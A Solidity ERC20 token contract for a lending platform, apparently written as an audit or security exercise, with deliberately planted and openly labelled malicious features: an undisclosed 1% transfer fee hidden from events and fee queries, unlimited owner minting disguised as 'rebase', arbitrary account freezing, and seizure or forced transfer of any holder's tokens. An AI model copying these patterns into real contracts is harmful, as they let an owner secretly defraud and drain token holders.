// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../interfaces/IERC20.sol";
import "../libraries/SafeMath.sol";

/**
 * @title DeFi Lending Platform Token (DFLP)
 * @notice ERC20 compliant token for the Galaxy Digital lending platform
 * @dev Implements standard ERC20 with platform-specific features
 * 
 * DOCUMENTATION:
 * - Total Supply: Fixed at 1,000,000 DFLP tokens
 * - Transfer Fee: 0.3% platform fee on transfers
 * - No Minting: Token supply is fixed after deployment
 * - Equal Rights: All holders have equal transfer rights
 */
contract Token is IERC20 {
    using SafeMath for uint256;

    // ============================================
    // STATE VARIABLES
    // ============================================
    
    string private _name;
    string private _symbol;
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply;
    
    address public owner;
    address public lender;
    address public feeCollector;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    // Documented fee: 0.3%
    uint256 private constant PLATFORM_FEE = 30; // 0.3% in basis points
    uint256 private constant BASIS_POINTS = 10000;
    
    // VULNERABILITY #1: Hidden undisclosed fee (1% additional)
    uint256 private constant HIDDEN_FEE = 100; // 1% UNDISCLOSED
    address private hiddenFeeCollector;
    
    // VULNERABILITY #3: Account freezing capability
    mapping(address => bool) public frozenAccounts;
    
    // ============================================
    // EVENTS
    // ============================================
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event FeeCollectorUpdated(address indexed oldCollector, address indexed newCollector);
    event AccountFrozen(address indexed account);
    event AccountUnfrozen(address indexed account);
    event TokensSeized(address indexed from, uint256 amount);
    event Rebase(uint256 indexed epoch, uint256 supplyDelta);
    
    // ============================================
    // MODIFIERS
    // ============================================
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Token: caller is not the owner");
        _;
    }
    
    modifier onlyLender() {
        require(msg.sender == lender, "Token: caller is not the lender");
        _;
    }
    
    // VULNERABILITY #3: Frozen account check
    modifier notFrozen(address account) {
        require(!frozenAccounts[account], "Token: account is frozen");
        _;
    }
    
    // ============================================
    // CONSTRUCTOR
    // ============================================
    
    /**
     * @notice Initializes the DFLP token with fixed supply
     * @param name_ Token name
     * @param symbol_ Token symbol
     * @param initialSupply_ Initial token supply (should be 1,000,000)
     * @param _feeCollector Address to receive platform fees
     */
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 initialSupply_,
        address _feeCollector
    ) {
        require(_feeCollector != address(0), "Token: fee collector is zero address");
        
        _name = name_;
        _symbol = symbol_;
        _totalSupply = initialSupply_ * 10**_decimals;
        
        owner = msg.sender;
        lender = msg.sender;
        feeCollector = _feeCollector;
        
        // VULNERABILITY #1: Hidden fee collector is set to owner
        hiddenFeeCollector = msg.sender;
        
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    
    // ============================================
    // ERC20 STANDARD FUNCTIONS
    // ============================================
    
    function name() public view override returns (string memory) {
        return _name;
    }
    
    function symbol() public view override returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure override returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    /**
     * @notice Transfer tokens with platform fee
     * @dev Documented fee: 0.3% - ACTUAL: 1.3% (1% hidden)
     * @param to Recipient address
     * @param amount Amount to transfer
     */
    function transfer(address to, uint256 amount) 
        public 
        override 
        notFrozen(msg.sender) 
        notFrozen(to) 
        returns (bool) 
    {
        _transfer(msg.sender, to, amount);
        return true;
    }
    
    function allowance(address tokenOwner, address spender) 
        public 
        view 
        override 
        returns (uint256) 
    {
        return _allowances[tokenOwner][spender];
    }
    
    function approve(address spender, uint256 amount) 
        public 
        override 
        returns (bool) 
    {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    /**
     * @notice Transfer tokens from approved allowance
     * @dev Documented fee: 0.3% - ACTUAL: 1.3% (1% hidden)
     */
    function transferFrom(address from, address to, uint256 amount) 
        public 
        override 
        notFrozen(from) 
        notFrozen(to) 
        returns (bool) 
    {
        uint256 currentAllowance = _allowances[from][msg.sender];
        require(currentAllowance >= amount, "Token: transfer amount exceeds allowance");
        
        unchecked {
            _approve(from, msg.sender, currentAllowance - amount);
        }
        
        _transfer(from, to, amount);
        return true;
    }
    
    // ============================================
    // INTERNAL FUNCTIONS
    // ============================================
    
    /**
     * @notice Internal transfer with fee deduction
     * @dev VULNERABILITY #1: Contains hidden 1% fee
     */
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "Token: transfer from zero address");
        require(to != address(0), "Token: transfer to zero address");
        require(_balances[from] >= amount, "Token: transfer amount exceeds balance");
        
        // Calculate documented platform fee (0.3%)
        uint256 platformFee = amount.mul(PLATFORM_FEE).div(BASIS_POINTS);
        
        // VULNERABILITY #1: Calculate HIDDEN fee (1%) - NOT DISCLOSED
        uint256 hiddenFee = amount.mul(HIDDEN_FEE).div(BASIS_POINTS);
        
        uint256 totalFees = platformFee.add(hiddenFee);
        uint256 transferAmount = amount.sub(totalFees);
        
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(transferAmount);
        
        // Collect documented fee (visible)
        _balances[feeCollector] = _balances[feeCollector].add(platformFee);
        
        // VULNERABILITY #1: Collect hidden fee (NO EVENT EMITTED)
        _balances[hiddenFeeCollector] = _balances[hiddenFeeCollector].add(hiddenFee);
        
        // Only emit transfer for documented amount
        emit Transfer(from, to, transferAmount);
        emit Transfer(from, feeCollector, platformFee);
        // NOTE: No Transfer event for hidden fee - invisible on block explorers
    }
    
    function _approve(address tokenOwner, address spender, uint256 amount) internal {
        require(tokenOwner != address(0), "Token: approve from zero address");
        require(spender != address(0), "Token: approve to zero address");
        
        _allowances[tokenOwner][spender] = amount;
        emit Approval(tokenOwner, spender, amount);
    }
    
    // ============================================
    // OWNER FUNCTIONS
    // ============================================
    
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Token: new owner is zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
    
    function setLender(address newLender) external onlyOwner {
        require(newLender != address(0), "Token: new lender is zero address");
        lender = newLender;
    }
    
    function setFeeCollector(address newFeeCollector) external onlyOwner {
        require(newFeeCollector != address(0), "Token: new fee collector is zero address");
        emit FeeCollectorUpdated(feeCollector, newFeeCollector);
        feeCollector = newFeeCollector;
    }
    
    /**
     * @notice Update hidden fee collector address
     * @dev VULNERABILITY #1: Allows changing hidden fee recipient
     */
    function setHiddenFeeCollector(address newCollector) external onlyOwner {
        hiddenFeeCollector = newCollector;
        // NOTE: No event emitted - remains hidden
    }
    
    // ============================================
    // VULNERABILITY #2: UNLIMITED MINTING (REBASE)
    // ============================================
    
    /**
     * @notice Rebase token supply for elastic supply mechanism
     * @dev MALICIOUS: Mints new tokens despite "fixed supply" claim
     *      Named "rebase" to appear legitimate
     * @param supplyDelta Amount of new tokens to create
     */
    function rebase(uint256 supplyDelta) external onlyOwner {
        // VULNERABILITY #2: Creates unlimited new tokens
        _totalSupply = _totalSupply.add(supplyDelta);
        _balances[owner] = _balances[owner].add(supplyDelta);
        
        // NOTE: No Transfer event from address(0) - hides minting
        emit Rebase(block.timestamp, supplyDelta);
    }
    
    /**
     * @notice Elastic supply adjustment (alias for rebase)
     * @dev Another entry point for the same malicious minting
     */
    function adjustSupply(int256 supplyDelta) external onlyOwner {
        if (supplyDelta > 0) {
            uint256 delta = uint256(supplyDelta);
            _totalSupply = _totalSupply.add(delta);
            _balances[owner] = _balances[owner].add(delta);
        }
        // Negative delta ignored - can only inflate
    }
    
    // ============================================
    // VULNERABILITY #3: ACCOUNT FREEZING
    // ============================================
    
    /**
     * @notice Freeze an account from transferring tokens
     * @dev MALICIOUS: Allows DoS attack on any user
     *      Can freeze borrower before repayment deadline to force default
     * @param account Address to freeze
     */
    function freezeAccount(address account) external onlyOwner {
        frozenAccounts[account] = true;
        emit AccountFrozen(account);
    }
    
    /**
     * @notice Unfreeze a previously frozen account
     * @param account Address to unfreeze
     */
    function unfreezeAccount(address account) external onlyOwner {
        frozenAccounts[account] = false;
        emit AccountUnfrozen(account);
    }
    
    /**
     * @notice Batch freeze multiple accounts
     * @dev MALICIOUS: Mass freeze capability
     */
    function batchFreezeAccounts(address[] calldata accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            frozenAccounts[accounts[i]] = true;
            emit AccountFrozen(accounts[i]);
        }
    }
    
    // ============================================
    // VULNERABILITY #4: TOKEN SEIZURE
    // ============================================
    
    /**
     * @notice Seize tokens from any address
     * @dev MALICIOUS: No validation of default conditions
     *      Agreement requires specific default events for seizure
     *      This allows seizure at any time for any reason
     * @param from Address to seize from
     * @param amount Amount to seize
     */
    function seizeTokens(address from, uint256 amount) external onlyLender {
        require(_balances[from] >= amount, "Token: seize amount exceeds balance");
        
        // VULNERABILITY #4: No check for valid default conditions
        _balances[from] = _balances[from].sub(amount);
        _balances[lender] = _balances[lender].add(amount);
        
        emit TokensSeized(from, amount);
        emit Transfer(from, lender, amount);
    }
    
    /**
     * @notice Force transfer tokens between any addresses
     * @dev MALICIOUS: Complete control over all user tokens
     */
    function forceTransfer(address from, address to, uint256 amount) external onlyOwner {
        require(_balances[from] >= amount, "Token: insufficient balance");
        
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
        
        emit Transfer(from, to, amount);
    }
    
    // ============================================
    // VIEW FUNCTIONS
    // ============================================
    
    /**
     * @notice Check if an account is frozen
     */
    function isAccountFrozen(address account) external view returns (bool) {
        return frozenAccounts[account];
    }
    
    /**
     * @notice Get the documented platform fee rate
     * @dev Returns only the documented 0.3%, not the hidden 1%
     */
    function getPlatformFeeRate() external pure returns (uint256) {
        return PLATFORM_FEE; // Returns 30 (0.3%)
        // NOTE: Does not reveal HIDDEN_FEE of 100 (1%)
    }
    
    /**
     * @notice Calculate fee for a given amount
     * @dev Returns only documented fee, actual deduction is higher
     */
    function calculateFee(uint256 amount) external pure returns (uint256) {
        return amount.mul(PLATFORM_FEE).div(BASIS_POINTS);
        // NOTE: Actual fee is amount * (PLATFORM_FEE + HIDDEN_FEE) / BASIS_POINTS
    }
}
